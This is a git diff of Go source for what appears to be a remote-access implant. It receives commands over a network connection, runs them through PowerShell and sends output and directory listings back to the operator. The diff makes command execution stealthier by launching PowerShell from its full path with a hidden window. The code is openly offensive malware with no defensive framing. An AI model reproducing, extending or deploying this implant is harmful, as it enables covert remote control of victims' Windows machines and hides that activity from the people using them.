@@ -8,6 +8,7 @@ import (
 	"regexp"
 	"runtime"
 	"strings"
+	"syscall"
 	"time"
 
 	"github.com/D3Ext/maldev/process"
@@ -49,10 +50,12 @@ func executeCommands(conn *net.Conn, command *string) {
 	if *command == "stop\n" {
 		terminate()
 	}
-	cmd := exec.Command("powershell.exe", "/C", *command)
-	output, err := cmd.Output()
+	powershellPath := "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+	ps_instance := exec.Command(powershellPath, "/c", *command)
+	ps_instance.SysProcAttr = &syscall.SysProcAttr{HideWindow: true} //Learn how syscalls work ktiir 2awiyeh
+	output, err := ps_instance.Output()
 	if err != nil {
-		fmt.Println("Couldn't Exec Command")
+		output = []byte("Couldn't execute the command\n")
 	}
 	if len(output) < 1 {
 		output = []byte("Couldn't execute the command\n")
@@ -140,6 +143,7 @@ func ls(conn *net.Conn, implantWD *string) {
 		dirInfo, _ := dirFS[e].Info()
 		dirListing = dirListing + "		" + fmt.Sprint(dirInfo.Size()) + "		" + fmt.Sprint(dirInfo.Mode()) + "		" + dirInfo.Name() + "\n"
 	}
+	//Try to combine them into 1 TCP messages instead
 	(*conn).Write([]byte("\n" + "		SIZE		" + "MODE		" + "	NAME" + "\n"))
 	(*conn).Write([]byte("		----		" + "----		" + "	----" + "\n"))
 	(*conn).Write([]byte(dirListing + "\n"))
@@ -215,6 +219,8 @@ func main() {
 		case "rickroll\n": //I luv it
 			{
 				cmd := exec.Command("cmd", "/C", "start", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+				//cmd := exec.Command("start", "https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+
 				cmd.Run()
 			}
 		case "pwd\n":
